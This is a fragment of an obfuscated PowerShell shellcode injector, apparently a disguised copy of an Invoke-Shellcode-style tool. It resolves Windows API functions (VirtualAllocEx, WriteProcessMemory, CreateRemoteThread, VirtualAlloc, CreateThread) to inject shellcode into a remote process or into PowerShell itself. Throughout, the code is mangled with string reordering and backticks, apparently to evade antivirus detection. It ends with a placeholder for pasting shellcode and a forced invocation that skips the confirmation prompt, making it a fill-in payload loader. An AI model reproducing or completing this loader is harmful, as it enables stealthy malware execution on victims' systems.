        ${VirT`UaLalLo`CE`xa`D`Dr} = &("{2}{1}{0}" -f'ss','et-ProcAddre','G') ("{1}{0}{2}"-f'r','ke','nel32.dll') ("{0}{3}{1}{2}" -f 'V','tualA','llocEx','ir')
        ${virtu`A`lALL`o`c`ExdELeGAte} = &("{1}{0}{4}{3}{2}"-f 'e','G','Type','e','t-Delegat') @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        ${VIR`TUALA`LLo`cex} =  $WYtD8::("{8}{6}{2}{3}{1}{4}{0}{7}{5}"-f'onPo','rFunc','el','egateFo','ti','er','tD','int','Ge').Invoke(${v`IRTuaLal`lOc`EXAD`Dr}, ${V`iRtUAL`AlLoc`exdELE`GA`TE})
        ${W`RitePrO`CE`sS`mEmoRy`AdDR} = &("{1}{2}{0}{3}"-f'cAddres','Get-Pr','o','s') ("{2}{0}{3}{1}"-f 'el','l','kern','32.dl') ("{3}{0}{1}{4}{2}{5}" -f 'ritePr','ocess','em','W','M','ory')
        ${wr`iTEP`R`OCessmE`mOry`DeLEgATe} = &("{1}{2}{4}{3}{0}" -f 'e','Get','-De','egateTyp','l') @([IntPtr], [IntPtr], [Byte[]], [UInt32],   ( cHildItEm ('vARiablE:'+'Ha'+'FU'+'dw')  ).VAluE.("{0}{2}{3}{1}" -f 'Mak','e','eByRefT','yp').Invoke()) ([Bool])
        ${wri`TE`PRocESSMEM`O`Ry} =  (  CHiLDItEM  VarIAblE:wYTd8).VALUE::("{3}{0}{6}{1}{5}{2}{4}"-f 'et','e','ForFunctionPoi','G','nter','legate','D').Invoke(${W`RI`Te`prOceSSm`EMo`R`Yad`dr}, ${w`RITEp`R`oC`EssmemO`R`y`dELEgAte})
        ${CRea`Te`REM`OTEth`ReAdad`dr} = &("{1}{2}{3}{0}{4}" -f'es','Get','-Pro','cAddr','s') ("{1}{0}{2}{3}" -f'ernel3','k','2','.dll') ("{3}{1}{2}{0}" -f 'hread','e','moteT','CreateR')
        ${creA`TE`ReMo`T`EThreAddELeGA`Te} = &("{1}{2}{3}{0}{4}"-f'-DelegateTy','G','e','t','pe') @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${cReATeReMot`eT`hR`eAd} =  (  dIr ("vaR"+"iAbLE:"+"wy"+"t"+"d8")  ).VAlUE::("{5}{1}{4}{0}{3}{2}" -f 't','tDelegateFor','Pointer','ion','Func','Ge').Invoke(${CrEATEre`MoteT`HREaDA`Ddr}, ${cReatEReMOTe`T`hReadDe`lE`gA`Te})
        ${cLo`SEHaN`D`leAD`dr} = &("{1}{0}{2}{3}{4}"-f'roc','Get-P','Add','res','s') ("{1}{2}{3}{0}"-f'32.dll','k','ern','el') ("{2}{1}{0}"-f'e','loseHandl','C')
        ${cLOseHANdLE`D`eL`EGate} = &("{1}{2}{0}" -f 'teType','Get-Del','ega') @([IntPtr]) ([Bool])
        ${clO`S`EhandLE} =   $WYtD8::("{0}{2}{1}{4}{3}"-f 'GetDelegateFo','unct','rF','Pointer','ion').Invoke(${C`lO`SEha`NDL`eAdDR}, ${c`LoSehaN`DLe`DELe`GA`TE})
    
        &("{0}{1}{2}{3}"-f 'Wri','te','-Ver','bose') ('I'+'njecti'+'ng '+'s'+'hellc'+'ode '+'int'+'o '+'P'+'ID: '+"$ProcessId")
        
        if ( ${F`oR`ce} -or ${PSC`Md`lET}.("{2}{0}{4}{1}{3}"-f 'dCon','in','Shoul','ue','t').Invoke( ("{7}{0}{8}{12}{10}{1}{3}{4}{5}{9}{2}{11}{6}"-f 'o you','ry ','an','o','u','t your ','?','D',' w','evil pl','r','s','ish to ca'),
                 "Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)! " ) )
        {
            &("{4}{3}{2}{0}{1}"-f 'o','de','llc','he','Inject-RemoteS') ${prO`C`EsSiD}
        }
    }
    else
    {
        
        ${VIrT`UALALLOC`AD`DR} = &("{4}{1}{0}{3}{2}" -f 'cAddre','Pro','s','s','Get-') ("{1}{2}{0}"-f'2.dll','kernel','3') ("{0}{3}{1}{2}"-f 'Virt','lo','c','ualAl')
        ${Virt`UaLa`L`loC`d`e`lEGaTe} = &("{2}{4}{1}{0}{3}"-f 't','a','Get-Dele','eType','g') @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        ${V`iRT`U`AlaLloc} =  (  Item  ('vArIaB'+'Le:W'+'Yt'+'d'+'8')  ).ValuE::("{1}{3}{5}{4}{2}{0}" -f'inter','Get','tionPo','De','ForFunc','legate').Invoke(${V`I`RtuAlA`llOcaddR}, ${v`IRtualA`llOC`dElEGaTe})
        ${v`I`RtuA`Lfr`E`EADdR} = &("{0}{3}{2}{1}" -f 'Get','ddress','cA','-Pro') ("{2}{0}{3}{1}" -f 'nel32','dll','ker','.') ("{1}{2}{0}" -f'ee','Virtua','lFr')
        ${vIrTua`lf`R`EedelEgaTe} = &("{4}{5}{0}{3}{1}{2}" -f 'el','teT','ype','ega','Get','-D') @([IntPtr], [Uint32], [UInt32]) ([Bool])
        ${vIr`T`UaLfREE} =   $WytD8::("{1}{2}{5}{0}{4}{3}{6}"-f 'teFo','Ge','tD','ctio','rFun','elega','nPointer').Invoke(${vIr`T`UALF`Re`EADDR}, ${viR`Tu`AlFr`ee`DELe`gA`TE})
        ${CR`EAtET`h`R`e`ADaddr} = &("{1}{0}{3}{4}{2}"-f't-','Ge','ddress','Proc','A') ("{1}{0}{3}{2}"-f'd','kernel32.','l','l') ("{0}{2}{1}" -f'Cr','read','eateTh')
        ${cR`EatE`THR`eA`dDE`lEGaTE} = &("{4}{2}{0}{3}{1}"-f 't','ype','Delega','eT','Get-') @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${CREaT`eThrE`Ad} =  (  VariABLe wytd8).vALUE::("{6}{1}{8}{2}{4}{0}{5}{3}{7}"-f 'on','tDelegateFo','unct','nt','i','Poi','Ge','er','rF').Invoke(${CreA`T`eTHRe`ADA`DdR}, ${c`ReATeTHr`e`A`dDeLEga`Te})
        ${WaitfoR`S`iNGlEObJecT`Ad`dR} = &("{4}{1}{2}{0}{3}"-f'dres','t-Proc','Ad','s','Ge') ("{1}{2}{3}{0}"-f 'l','kern','el3','2.dl') ("{4}{0}{1}{2}{3}" -f'tF','orSin','gle','Object','Wai')
        ${WA`IT`F`OrSing`LeoBJEctDelE`ga`Te} = &("{1}{2}{3}{4}{0}"-f'teType','Ge','t-','Dele','ga') @([IntPtr], [Int32]) ([Int])
        ${wA`iTF`oR`sIngleobj`eCt} =  ( VaRIable  wyTd8  ).vALuE::("{8}{3}{4}{0}{5}{1}{7}{6}{2}"-f'gateF','rFun','inter','tDe','le','o','tionPo','c','Ge').Invoke(${wa`itfoRsinG`l`eoBj`eCTa`DDR}, ${W`A`IT`F`orsing`leoBJ`ECtDEL`EGaTe})
        
        &("{1}{0}{2}" -f'te-Ve','Wri','rbose') ("{1}{8}{5}{4}{2}{3}{7}{0}{9}{6}" -f 'nto ','I','g',' shellcode','ectin','j','owerShell',' i','n','P')
        
        if ( ${fO`RcE} -or ${PsCmD`LET}.("{2}{0}{1}{3}"-f'houldCon','tinu','S','e').Invoke( ("{6}{9}{3}{0}{4}{10}{11}{8}{2}{5}{7}{1}" -f ' c','lans?','l','o','arry ',' ','Do you wis','p',' evi','h t','out ','your'),
                 ("{5}{3}{7}{4}{2}{1}{8}{0}{6}{10}{9}"-f 'rSh','ow',' running P','sh','he','Injecting ','el','ellcode into t','e','ess!','l proc') ) )
        {
            &("{2}{1}{0}{4}{3}" -f'She','nject-Local','I','lcode','l')
        }
    }   
}

#Paste code below this line
$$$SCODE$$$
#Don't modify below this line

&("{1}{4}{0}{3}{2}"-f 'voke-She','I','e','llcod','n') -Shellcode $buf -Force
